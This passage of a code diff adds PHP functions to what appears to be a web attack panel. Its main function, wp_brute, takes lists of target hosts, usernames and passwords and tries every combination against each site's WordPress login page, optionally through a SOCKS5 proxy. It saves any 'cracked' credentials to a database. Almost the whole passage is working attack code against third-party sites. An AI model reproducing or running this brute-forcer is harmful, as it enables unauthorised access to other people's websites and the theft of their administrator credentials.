+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+    curl_setopt($ch, CURLOPT_PROXY, PROXY_IP.':'.PROXY_PORT);
+    }
+    curl_setopt($resURL, CURLOPT_URL, $strURL);
+    curl_setopt($resURL, CURLOPT_BINARYTRANSFER, 1);
+    curl_setopt($resURL, CURLOPT_HEADERFUNCTION, 'curlHeaderCallback');
+    curl_setopt($resURL, CURLOPT_FAILONERROR, 1);
+    curl_exec ($resURL);
+    $intReturnCode = curl_getinfo($resURL, CURLINFO_HTTP_CODE);
+    curl_close ($resURL);
+    if ($intReturnCode != 200){return false;}
+    else{return true ;}
+}
+function filter($string)
+{
+    if(get_magic_quotes_gpc() != 0){return stripslashes($string);    }
+    else{return $string;    }
+}
+function RemoveLastSlash($host)
+{
+    if(strrpos($host, '/', -1) == strlen($host)-1)
+    {return substr($host,0,strrpos($host, '/', -1));}
+    else{return $host;}
+}
+
+
+function wp_brute() {
+    if(isset($_POST['hosts']) && isset($_POST['passwords']) && isset($_POST['usernames']))
+{
+    $conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
+    mysql_select_db(SQL_DB, $conn);
+
+    $hosts = trim(filter($_POST['hosts']));
+    $passwords = trim(filter($_POST['passwords']));
+    $usernames = trim(filter($_POST['usernames']));
+
+    if($passwords && $usernames && $hosts)
+    {
+        $hostsx = explode("\n", $hosts);
+        $usersx = explode("\n", $usernames);
+        $passsx = explode("\n", $passwords);
+
+        echo '<div class="post">';
+        echo '<h2 class="title"><a href="#">Results</a></h2>';
+        echo '<div class="entry">';
+        echo '<p class="meta"> Wordpress CMS Bruteforce &nbsp;&bull;&nbsp; Broken credentials will be stored in database';
+
+
+        foreach($hostsx as $host)
+        {
+            $host = RemoveLastSlash($host);
+            $hxd = 0;
+            $host = str_replace(array("http://","https://","www."),"",trim($host));
+            $host = "http://".$host;
+            $wpAdmin = $host.'/wp-admin/';
+
+            if(!url_exists($host."/wp-login.php"))
+            {echo "<p>".$host." - <font color='#990000'>Login page not found</font></p>";ob_flush();flush();continue;}
+
+            foreach($usersx as $username)
+            {
+                foreach($passsx as $password)
+                {
+                    $ch   =     curl_init();
+                        if(USE_PROXY == 1) {
+                     curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
+                     curl_setopt($ch, CURLOPT_PROXY, PROXY_IP.':'.PROXY_PORT);
+                                            }
+                    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
+                    curl_setopt($ch,CURLOPT_URL,$host.'/wp-login.php');
+                    curl_setopt($ch,CURLOPT_COOKIEJAR,"coki.txt");
+                    curl_setopt($ch,CURLOPT_COOKIEFILE,"coki.txt");
+                    curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
+                    curl_setopt($ch,CURLOPT_POST,TRUE);
+                    curl_setopt($ch,CURLOPT_POSTFIELDS,"log=".$username."&pwd=".$password."&wp-submit=Giri&#8207;"."&redirect_to=".$wpAdmin."&testcookie=1");
+                    $login    =       curl_exec($ch);
+
+
+                    if(eregi ("profile.php",$login) )
+                    {
+                        $hxd = 1;
+                        echo "<p>".$host." - Cracked! Username - <font color='#990000'>".$username."</font> & Password : <font color='#990000'>".$password."</font></p>";
+                        mysql_query("INSERT INTO brute(service, credentials) VALUES ('".mysql_escape_string($host).":80', '".mysql_escape_string($username).":".mysql_escape_string($password)."')", $conn);
+                        ob_flush();flush();break;
+                    }
+                }
+                if($hxd == 1){break;}
+            }
+            if($hxd == 0)
+            {echo "<p>".$host." - <font color='#990000'>Failed</font></p>";ob_flush();flush();}
+        }
+    echo '</div></div>';
+    }
+    else {echo "<h2><font color='#990000'>All fields are required!</font></h3>";}
+}
+mysql_close($conn);
+}
+
 
 //Startups
 
